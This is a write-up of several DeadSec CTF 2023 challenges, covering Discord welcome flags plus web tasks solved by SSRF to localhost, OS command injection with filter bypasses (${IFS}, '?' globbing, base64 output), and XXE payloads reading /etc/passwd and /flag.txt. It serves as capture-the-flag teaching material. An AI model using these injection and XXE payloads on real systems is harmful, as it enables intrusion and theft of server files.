# DeadSec CTF 2023 - WriteUp

## Welcome Challenges

## Welcome

Value : **1pts**

Description :

```
Welcome to DeadSec CTF 2023!

Join Our Discord: [https://discord.gg/SRP4m6Su](https://discord.gg/SRP4m6Su)
```

### Solution

Join the discord server, look at ```#announcement``` channel. You can see the flag approximatively once the CTF started (or in the pinned messages).

**IMAGE WELCOME1**

FLAG : **Dead{W3c0me_t0_D3edSec_CTF}**

## Welcome 2

Value : **50pts**

Author : **onsra**

Description :

```
Greeting each other in General/Welcome discord, you might receive a FLAG or not. 

Format: **Dead{what you find}**
```

### Solution

Looking at the ```#welcome``` channel, on the ```GENERAL``` category. We doesnt see anything that seem relevant. (Excepted if the player try to hint because they already solve it.)

Looking at bot, there is only ```Tickets``` bot.

Looking at the server emoji, and we can find a lot of emoji ```memes```.

**IMAGE WELCOME2**

If we look carefully, we can notice the right flag on one of them (Just be lazy, take a screenshot and zoom in).

**IMAGE WELCOME2FLAG**

Flag : **Dead{deadsec_ctf_hehe_@@!!!}**

## Web Challenges

### FRSS

Value : **50pts**

Author : **onsra**

Description : 

```
**Url: [https://www.deadsec.xyz/instances/frss](https://www.deadsec.xyz/instances/frss)**
```

### Solution

Once on the challenge page. We notice an URL user input, with a code leak that show us that ```curl``` is used.

**IMAGE 1**

Curl as three option :

The two first are made to only allow redirection to the protocol ```HTTP```, other protocol will not be allowed. 

The thrid is used to make only one redirection.

Let's try to get the content of google.com

```
URL = google.com
```

**IMAGE 2**

It seem to work! Now, as our challenge is under the HTTP protocol, what happen if i put the localhost as URL?

```
URL = 127.0.0.1
```

**IMAGE 3**

We got the content of the home page as answer! Great. Now let's try to recover the flag whic is located on "hehe.txt".

```
url = 127.0.0.1/hehe.txt
```

**IMAGE 4**

Whoops! Our URL is too long! Let's try to change the localhost format. 

And after few try...

```
URL = 0.0.0.0/hehe.txt
```

**IMAGE 5**

We got the flag!

> Note : Fun fact. I solved this challenge literally at the timeout of the CTF... 15h00, so i solved it, but not submitted the flag :s

**IMAGE FUCKED**

FLAG : **dead{Ashiiiibaaa_you_hAv3_Pybass_chA11}**

## Bing

Value : **50pts**

Author : **onsra**

Description :

```
**Url: [https://www.deadsec.xyz/instances/bing](https://www.deadsec.xyz/instances/bing) **
```

### Solution

Once on the challenge we see this home page.

**IMAGE 1**

We can see a page ```Flag for you```, looking at it we see this page.

**IMAGE 2**

Apparently, we need to put an IP address. Let's try some random IP address.

```
127.0.0.1
```

**IMAGE 3**

We got an error, but apparently we run a command "127.0.0.1", so maybe we have code execution here. If we try to bypass it, we got this result when we try to click the "submit" button.

```
127.0.0.1|whoami
```

**IMAGE 4**

So we can't actually submit our request because of that verification from the button.

So let's fire burp suite to simply send request without pressing the button.

Follow these step :
```
Open Burp Suite, in the "proxy" tab open the browser. 

On the browser, reech the challenge URL, write any ip address.

Come back to Burp Suite and press "Intercept On" button.

Come back to the browser and submit the request with the ip address.

Come back to Burp Suite, it should have intercepted the request.
```

**IMAGE 5**

Now on ```Action``` send the request to the ```repeater```.

**IMAGE 6**

Now let's try our bypass again. We will put the character ```"|"``` right after the ip address, to add another command which should be executed.

```
127.0.0.1|whoami
```

**IMAGE 7**

It work! Now let's try to liste files and directory.

```
127.0.0.1|whoami|ls
```

**IMAGE 8**

Huh... Oh-oh, there is some protection. Apparently we can't use ```ls``` command. Let's try to use another way to list files and directory using ```dir```.

```
127.0.0.1|whoami|dir
```

**IMAGE 9**

Great! But as you can see, it show only our new command and forgot the previous one.
Let's try to change our bypass character by using the character ```";"``` this time.

```
127.0.0.1;whoami;dir
```

**IMAGE 10**

Nice, let's move on. We will try to list "all" the files and directory with ```dir -a```. But of course, with a space it will be hard.

```
127.0.0.1;whoami;dir -a
```

**IMAGE 11**

Trying to URL encode doesnt work. So let's try to find another way to bypass forbidden space. You can refere to the source bellow.

Source : https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions#bypass-forbidden-spaces

By using the characters ```${IFS}``` we can make space in our request. If you need more informations about what is ```IFS``` you can look at the source bellow.

Source : https://unix.stackexchange.com/questions/26784/understanding-ifs

```
127.0.0.1;whoami;dir${IFS}-a
```

**IMAGE 11-2**

Great so now that we enumerate all the files and directory, we doesnt find the flag there, so let's look at the base of the machine.

```
127.0.0.1;whoami;dir${IFS}-a${IFS}/
```

**IMAGE 12**

Great we find the flag! Let's try to read it. But first, we will try to read the ```requirements.txt``` to be sure that it work, because maybe there are additionnal protection on the ```flag.txt``` file.

```
127.0.0.1;whoami;dir${IFS}-a;cat${IFS}requirements.txt
```

**IMAGE 13**

Oh no... We can't use ```cat``` to read files. Let's try with ```more``` as alternative.

```
127.0.0.1;whoami;dir${IFS}-a;more${IFS}requirements.txt
```

**IMAGE 14**

Great!

Now let's try to read the flag.

```
127.0.0.1;whoami;dir${IFS}-a$;more${IFS}/flag.txt
```

**IMAGE 15**

ARGH! Apparently, there is some protection. At this moment we need to think, what kind of protection can be there... First think that i was thinking is, maybe we arent allowed to type "flag.txt". So how can i specify this file without giving the full name?

If you know, you know! If you didnt, i dont really know which ressource to give. But you need to know that in bash you can specify "?" character to guess some letter if you provide some of them.

Here is an example using "/bin/whoami"

**IMAGE BONUS**

Now let's try on our target flag.

```
127.0.0.1;whoami;dir${IFS}-a;more${IFS}/fl?g.txt
```

**IMAGE 16**

Great!! It forgot all our output, and told us that we can read the flag!! So apparently we got the right methode. Now apparently, reading the flag return the output saying that we can read it. Why? Maybe because the application told that if you read the flag, it will not print the content but return that, yes you can read it.

So how bypass it? Let's see if we can use ```base64``` to encode the flag.

```
127.0.0.1;whoami;dir${IFS}-a;base64${IFS}--help
```

**IMAGE 17**

Perfect! Now let's encode the flag.


```
127.0.0.1;whoami;dir${IFS}-a;base64${IFS}/flag.txt
```

**IMAGE 18**

Good we get the ```base64```, on Burp, in the "Response" part, you can swith to ```Raw``` view to select the base64.

```base64
ZGVhZHtva29rb2shISFfdGgxc19mbEFnX2YwUl9ZMFV9Cg==
```

**IMAGE 19**

Now at the rigth you should have the ```base64``` auto decoded, if not, you can simply right click on the strings > send to decoder > decode as base64 to ascii.

**IMAGE 20**

FLAG : **dead{okokok!!!_th1s_flAg_f0R_Y0U}**

## XXE1

Value : **50pts**

Author : **onsra**

Description :

```
flag in flag.txt

**Url: [https://www.deadsec.xyz/instances/xee1](https://www.deadsec.xyz/instances/xee1)**
```

### Solution

Once on the challenge page, we seen a login form. Trying to authenticate as ```admin:admin``` work.

**IMAGE 1**

As the name said, there should be a Xml Eternal Entity vulnerability somewhere. So let's run Burp Suite, go to the "Proxy" tab, open a browser, and intercept the login request.

**IMAGE 2**

Now let's try to exploit the XSS to read ```/etc/passwd``` file, by using our "admin" username as entity.

```
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>

<user>
	<username>&xxe;</username>
	<password>admin</password>
</user>
```

**IMAGE 3**

Great! We successfully exploited it! Now let's read our flag.

```
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///flag.txt"> ]>

<user>
	<username>&xxe;</username>
	<password>admin</password>
</user>
```

**IMAGE 4**

Oh. We are not allowed to read it... So how to retrieve it, whithout reading it? By encoding and then decoding it!

Let's encode it using base64!

```
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt"> ]>

<user>
	<username>&xxe;</username>
	<password>admin</password>
</user>
```

**IMAGE 5**

Great it work! We encoded the flag in base64, and once selected, Burp decode it and we got the flag!!

> Note : If its not the case, send the selected base64 to decoder by right clicking on it, and then, decode it as base64 to ASCII.


Flag : **dead{n1ce_br0_XE3_3z_h3h3}**

